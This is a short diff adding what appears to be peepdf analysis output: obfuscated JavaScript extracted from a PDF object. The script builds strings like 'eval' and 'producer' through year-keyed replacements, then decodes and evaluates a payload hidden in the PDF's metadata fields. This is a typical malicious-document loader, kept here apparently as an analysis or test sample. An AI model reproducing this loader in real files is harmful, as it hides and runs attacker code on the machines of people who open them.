@@ -1,0 +1,27 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+<< /Names [(test) <</S /JavaScript
+/JS (
+var date = new Date();
+cyt='';
+var q = date.getFullYear()-2007;
+spdvf='2011s'.replace(date.getFullYear(),'hi');
+xkav=('tit2011').replace(date.getFullYear(),'le');
+g=new Function('a','return t'+spdvf+'[a]');
+var cynfz = g(xkav);
+csogb=('sub2011').replace(date.getFullYear(),'ject');
+var tlvg=g(csogb).replace(date.getFullYear(),'al');
+wzoht=g(tlvg);
+sko='pro2011cer';
+sko=wzoht('sko.replace(date.getFullYear(),"du")');
+slruh=wzoht(g(sko));
+irtoq = wzoht(cynfz);
+for (i = 0; i < irtoq.length; i++) {
+	kgkac = irtoq[i];
+	cyt += slruh(kgkac);
+}
+wzoht(cyt);
+)
+>>]
+>>
+
